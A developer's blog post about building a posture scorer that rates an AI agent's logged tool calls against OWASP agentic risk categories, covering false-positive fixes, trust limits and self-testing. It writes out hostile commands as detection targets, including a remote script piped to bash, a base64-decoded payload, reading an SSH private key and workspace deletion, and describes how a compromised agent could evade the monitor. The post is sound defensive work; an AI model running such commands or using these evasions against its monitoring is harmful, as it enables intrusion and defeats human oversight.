# I built an OWASP Agentic posture scorer from my agent's telemetry alone — here's what it caught (and what it can't)

*How a false-positive hunt turned into a 59-test validation suite, and why
honest coverage is the whole product.*

My AI agent runs my servers. It edits files, restarts services, pushes to
GitHub. One day I realized something uncomfortable: **I had no record of
what it actually did.** If an agent issues a tool call and the call is
silently lost — say, during a context-compaction teardown — nothing tells
you. The agent believes it acted. The world was never changed.

So I built [agent-ledger](https://github.com/ZidoCode/agent-ledger): a
write-ahead ledger for agent side effects. Every tool call is written
before it executes; every completion confirms it. A call that was issued
but never confirmed becomes a **ghost** — and the ghost is injected back
into the agent's context so it verifies reality instead of trusting its own
memory.

That was the reliability half. Then I asked the question that turned this
into a security project:

> If the ledger records everything my agent does, can I score how *safe*
> that behavior is?

## The OWASP connection

In December 2025, the OWASP GenAI Security Project published the
[Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
— ASI01 through ASI10. Tool misuse. Unexpected code execution. Cascading
failures. Rogue agents. Excessive agency.

What struck me: **almost nobody ships a tool that scores an agent against
it.** The category is nearly empty. Enterprise players (Wiz, Snyk, Lasso)
are busy with cloud and model security; the agent *behavior* layer is
barely claimed.

One honest caveat before the code: the official OWASP list is ASI01–ASI10.
My scorer covers five of those plus **ASI11 "excessive agency" — a community
extension, not part of the official list** — because mutating-call volume is
a genuinely useful signal even if OWASP doesn't name it. I label it `(ext)`
in every report so nobody mistakes it for a standard category.

So I wrote `posture.py` — a module that reads the ledger and emits a
0–100 posture score. It took an afternoon. It was confidently, disastrously
wrong. Here's the part worth reading.

## The 16 false positives that killed my first version

I did the one thing most side projects skip: I tested against a ledger of
**provably benign activity**. `git status`. `npm test`. `pytest`. `pip
install`. Nothing dangerous at all.

**Score: 0/100. Sixteen findings.**

A posture module that flags every normal day as a breach is worse than no
module — it trains you to ignore alerts. Debugging it taught me more about
security tooling than building the detector did:

**1. I was scanning JSON, not commands.** The ledger stores tool arguments
as JSON strings. In JSON, `\n` is two literal characters — so my heredoc
stripping (`python3 - <<EOF ... EOF`) never fired, and the entire body of
every inline Python script I'd ever run was being scanned as if it were a
shell command. The fix: parse the JSON first, restore real newlines, *then*
pattern-match. Sounds obvious. I shipped the bug anyway.

**2. The word "token" is poison.** My credential-access regex included
`\btoken\b`. I work with LLMs. `total_tokens`, `count_tokens`,
`token_budget.py` — the word appears constantly in perfectly innocent work.
Six of my sixteen false positives were just... writing code about tokens.
The fix: only flag *real* secret-store paths (`~/.ssh/`, `id_rsa`,
`.git-credentials`), and only raise the generic-word detector when it's
combined with an exfiltration-shaped verb (`curl`, `base64`, `scp`).

**3. `pip install` is not an attack.** My first regex treated any package
manager as "unexpected code execution." I removed it entirely. Plain
`pip install` is what a developer does before lunch. The thing worth
flagging is `curl https://evil.tld/x.sh | bash` — remote code piped
straight into a shell.

**4. Deleting your own cache is not destruction.** `rm -f
~/.cache/x.txt` tripped the destructive-command detector. Now `rm` has
severity tiers: `rm -rf /`, `rm -rf ~`, `rm -rf ./` are HIGH; targeted
single-file cleanup is housekeeping.

## The trust model nobody wants to write about

There's a flaw at the center of any observer-only security tool, and I can't
engineer it away, so I'll state it plainly: **the ledger is written by the
agent being scored.** A compromised agent can simply not log its bad
actions — or log false ones. An observer plugin watching from the side
cannot stop that. A score of 100 means "nothing suspicious in the recorded
activity", not "the agent was well-behaved."

Fixing this properly needs tamper-evident logging and writers the agent
can't reach — a different (and much harder) architecture. Until then, the
score is a **hygiene signal over available evidence**, and every report says
so. I'd rather ship an honest instrument with a known blind spot than a
green checkmark that lies.

## Then I attacked my own detector

Fixing false positives is half the job. The other half is asking: *if I
were a compromised agent, how would I evade this?* So I became one:

- `echo <base64> | base64 -d | bash` — obfuscated payload. **Caught nothing
  at first.** Now caught.
- `SSH=$HOME/.ssh; cat $SSH/id_rsa` — variable indirection to dodge path
  regexes. **Caught nothing.** Now caught.
- `rm -rf ./` — destroy the workspace without touching an absolute path.
  **Caught nothing.** Now caught.
- `git push -f` (short flag, not `--force`). **Caught nothing.** Now caught.

Every evasion that slipped through became a permanent unit test. That's the
rule: *if it fooled you once, it tests you forever.*

## What 59 tests buy you (and what they don't)

The final suite:

- **Ground-truth harness** — a benign ledger must score exactly 100 with
  zero findings; a planted malicious ledger must light up every covered ASI
  family. Both conditions are hard assertions.
- **Per-ASI unit tests** — every detector gets a must-fire case *and* a
  must-not-fire case. The must-not-fire half is where all the real bugs
  lived.
- **Adversarial evasion suite** — the seven attacks above, permanently.
- **Scale test** — 10,000 rows scored in **0.054s**, 50,000 in 0.281s.
  Multi-session ledgers attribute findings to exactly the right rows.
- Plus the ledger's own 13 self-tests (FIFO confirmation matching, ghost
  reconciliation).

One more honest limit: the evasion suite proves I catch **all seven evasion
patterns I know about**. It proves nothing about the ones I don't. Signature
detection over ledger metadata is, by construction, a step behind attacks
nobody has written a rule for yet — that's an open problem, not a solved
one. The partial mitigation I ship today is behavioral: rate spikes, error
bursts, and ghost agents degrade the score even when no signature matches,
because *unusual* is itself a signal. If someone claims their detector
"can't be evaded," they're selling you the one thing no signature scanner
has ever had.

Here's the thing I refuse to do, though: claim full OWASP coverage. From
ledger *metadata* alone, I can honestly cover four of the official ten —
ASI02, ASI05, ASI08, ASI10 — plus ASI11 (the community extension). The other
five (goal hijack, identity abuse, supply chain, memory poisoning,
inter-agent trust) require inspecting payloads and conversations, which is a
different product with a different trust model.

So every posture report ends with:

```
Covered: ASI02, ASI05, ASI08, ASI10, ASI11 (ext)
Requires payload inspection (not covered): ASI01, ASI03, ASI04,
ASI06, ASI07, ASI09
```

**The "not covered" line is the feature.** Security tools that claim total
protection are advertising, not tooling. An honest boundary is what makes
the covered half trustworthy.

## What it found on my own machine

Running the finished scorer against my agent's real ledger: score 24/100,
six findings. I audited every one:

- Four were **true positives with an embarrassing pedigree** — my own
  terminal history contains `cat ~/.git-credentials` and greps through
  `.env` files, because I spent a day cleaning up exposed GitHub tokens
  (my own, leaked by my own workflows). The posture scorer correctly
  noticed that credential stores were being read. It doesn't know *why*.
  That's exactly what a posture tool should do.
- One error burst during a deployment debugging session. Real.
- One ghost. Real.

Zero false positives. That's the difference between the first version and
this one.

## The delivery loop

Scoring is useless if nobody looks at it. `posture_daily.py` now runs on
cron every day at 15:00 my time and sends a Telegram report: the score, the
delta versus yesterday, the top findings by severity. Score drops are the
signal; a drop you don't see is just data.

## What I'd tell anyone building agent observability

1. **Write-before-act is the foundation.** You can't score behavior you
   didn't record. The ledger came first; the posture module is a reader
   over it. Build the record, then the judgment.
2. **Test against innocent data before hostile data.** The 16 false
   positives on a benign ledger were a worse failure than any missed attack
   would have been. A detector that cries wolf gets uninstalled.
3. **State your blind spots in the output itself.** Not in your README — in
   every report. It's the only way the "covered" list stays honest.
4. **Every evasion becomes a test.** Your detector's TODO list is written
   by its attackers.

The whole thing is open source — ledger, posture scorer, all 59 tests, the
evasion suite, and the daily Telegram reporter:

**→ [github.com/ZidoCode/agent-ledger](https://github.com/ZidoCode/agent-ledger)** (v0.3.4)

It's also submitted to the official Hermes Agent plugin catalog
([PR #135993](https://github.com/NousResearch/hermes-agent/pull/135993))
— if it merges, it's the first security/audit plugin in the catalog.

Next on the roadmap: per-session posture reports and policy packs. If you
build with agents, I'd genuinely like to know what your agent's posture
score is — and what the "not covered" line makes you think about.

---

*Building in public: agent security & reliability tooling.
[github.com/ZidoCode](https://github.com/ZidoCode)*
